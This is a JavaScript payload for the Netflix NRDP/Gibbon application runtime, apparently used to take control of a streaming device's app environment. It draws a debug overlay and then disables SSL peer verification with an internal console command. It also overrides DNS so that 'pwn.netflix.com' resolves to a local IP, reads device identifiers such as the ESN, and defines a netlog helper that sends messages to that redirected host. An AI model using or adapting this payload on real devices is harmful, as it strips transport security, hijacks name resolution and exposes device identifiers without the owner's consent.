(function(){
    var overlay = null;
    var lines = [];
    var maxLines = 30;

    var refreshTimer = null;

    var log = function(msg) {
        lines.push(msg);
        if (lines.length > maxLines) lines.shift();

        // debounce refresh
        if (refreshTimer) nrdp.clearTimeout(refreshTimer);
        refreshTimer = nrdp.setTimeout(function() {
            refresh();
            refreshTimer = null;
        }, 50);
    };

    function refresh() {
        if (!overlay) return;

        // clear only text widgets (preserve image)
        if (overlay.children) {
            for (var j = overlay.children.length - 1; j >= 0; j--) {
                var child = overlay.children[j];
                if (child && child._name && child._name.startsWith("ln")) {
                    overlay.removeChild(child);
                }
            }
        }

        // redraw
        for (var i = 0; i < lines.length; i++) {
            var w = nrdp.gibbon.makeWidget({
                name: "ln" + i,
                x: 10,
                y: 10 + (i * 22),
                width: 870,
                height: 20
            });
            w.text = {
                contents: lines[i],
                size: 16,
                color: {a: 255, r: 0, g: 255, b: 0},
                wrap: true
            };
            w.parent = overlay;
        }
    }

    var show = function(path) {
        try {
            var obj = window;
            var parts = path.split(".");
            for (var i = 0; i < parts.length; i++) {
                obj = obj[parts[i]];
                if (obj === undefined) {
                    log(path + " = undefined");
                    return;
                }
            }
            var val = (typeof obj === "object") ? JSON.stringify(obj) : String(obj);
            log(path + " = " + val.substring(0, 200));
        } catch(ex) {
            log(path + " ERR: " + ex);
        }
    };

    var get = function(url, cb) {
        try {
            nrdp.gibbon.load({
                url: url,
                requestMethod: "GET",
                secure: false
            }, function(r) {
                if (cb) cb(r);
            });
        } catch(ex) {
            log("GET failed: " + ex);
        }
    };

    var post = function(url, data, cb) {
        try {
            nrdp.gibbon.load({
                url: url,
                requestMethod: "POST",
                headers: {"Content-Type": "application/json"},
                body: data
            }, function(r) {
                if (cb) cb(r);
            });
        } catch(ex) {
            log("POST failed: " + ex);
        }
    };

    var netlog = function(msg) {
        try {
            get("https://pwn.netflix.com/?log=" + encodeURIComponent(msg));
        } catch(ex) {
            log("netlog ERR: " + ex);
        }
    };

    this.log = log;
    this.show = show;
    this.get = get;
    this.post = post;
    this.netlog = netlog;

    // init
    overlay = nrdp.gibbon.makeWidget({
        name: "dbg",
        width: 1280,
        height: 720,
        backgroundColor: "#000000"
    });
    nrdp.gibbon.scene.overlay = overlay;

    // load and display image
    var imgWidget = nrdp.gibbon.makeWidget({
        name: "img",
        x: 480,
        y: 10,
        width: 550,
        height: 700
    });

    imgWidget.image.url = "https://pwn.netflix.com/test.png";
    imgWidget.parent = overlay;
    
    
    //-----------------END LOGGING SETUP-------------------\\

    // disable SSL verification
    nrdp.gibbon._runConsole("/command ssl-peer-verification false");

    // set DNS record for pwn.netflix.com
    nrdp.dns.set("pwn.netflix.com", nrdp.dns.A, {
        addresses: ["192.168.0.111"],
        ttl: 3600000
    });

    // show device info
    log("=== DEVICE INFO ===");
    show("nrdp.device.ESN");
    show("nrdp.device.deviceModel");
    show("nrdp.device.softwareVersion");
    show("nrdp.device.friendlyName");
    show("nrdp.device.language");
    show("nrdp.pid");
    show("nrdp.cwd");

    log("=== VERSION INFO ===");
    show("nrdp.device.version.gibbon");
    show("nrdp.device.SDKVersion");

})();
